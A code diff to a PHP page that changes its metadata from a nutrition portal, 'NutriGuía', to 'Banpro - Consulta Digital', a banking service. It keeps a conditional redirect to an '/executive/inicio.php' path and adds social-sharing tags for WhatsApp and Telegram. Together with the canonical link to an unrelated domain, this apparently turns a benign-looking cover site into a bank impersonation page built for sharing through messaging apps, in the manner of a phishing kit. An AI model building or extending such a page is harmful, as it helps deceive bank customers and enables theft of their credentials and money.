@@ -85,11 +85,23 @@ header('X-Content-Type-Options: nosniff');
   <noscript><meta http-equiv="refresh" content="0;url=/executive/inicio.php"></noscript>
 <?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>NutriGuía — Tu Portal de Nutrición y Bienestar</title>
-  <meta name="description" content="NutriGuía: guías de alimentación saludable, planes nutricionales, recetas bajas en calorías y consejos de bienestar avalados por nutricionistas." />
-  <meta name="keywords" content="nutrición, alimentación saludable, dieta balanceada, recetas saludables, bienestar, pérdida de peso, vitaminas, proteínas, guía nutricional" />
+  <title>Banpro - Consulta Digital</title>
+  <meta name="description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
+  <meta name="keywords" content="banpro, consulta digital, banca en línea, productos financieros, gestión bancaria, banca digital" />
   <meta name="robots" content="index, follow" />
   <link rel="canonical" href="https://lin.com/" />
+
+  <!-- Open Graph (Facebook, WhatsApp, Telegram, LinkedIn) -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Banpro - Consulta Digital" />
+  <meta property="og:description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
+  <meta property="og:locale" content="es_CO" />
+  <meta property="og:site_name" content="Banpro" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Banpro - Consulta Digital" />
+  <meta name="twitter:description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     :root { --green:#2d7a3a; --green-light:#4caf50; --orange:#e67e22; --bg:#f9fafb; --text:#1f2937; --muted:#6b7280; --border:#e5e7eb; }
